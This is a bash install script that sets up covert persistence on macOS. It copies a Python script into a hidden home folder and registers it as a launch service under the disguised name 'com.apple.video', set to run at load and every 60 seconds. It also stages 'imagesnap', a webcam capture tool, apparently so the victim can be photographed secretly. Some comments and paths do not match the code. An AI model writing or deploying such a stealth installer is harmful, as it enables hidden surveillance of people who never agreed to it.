#!/bin/bash

#Create the hidden directory ~/.textedit
mkdir $HOME/.hidden

#Copy the script to hidden folder

cp woffice.py $HOME/.hidden/woffice.py


#Give the script permission to execute
chmod +x $HOME/.hidden/woffice.py

#Create directory if it doesn't already exist.
mkdir $HOME/Library/LaunchAgents

#Write the .plist to LaunchAgents
echo '
<plist version="1.0">
    <dict>
    <key>Label</key>
        <string>com.apple.video</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python</string>
        <string>'$HOME'/.hidden/woffice.py</string>
    </array>
    <key>RunAtLoad</key>
        <true/>
    <key>StartInterval</key>
        <integer>60</integer>
    <key>AbandonProcessGroup</key>
        <true/>
    </dict>
</plist>
' > /Library/LaunchDaemons/com.apple.video.plist

#Load the LaunchAgent
launchctl load /Library/LaunchDaemons/com.apple.video.plist

#Copy imagesnap to the hidden directory
cp imagesnap $HOME/.hidden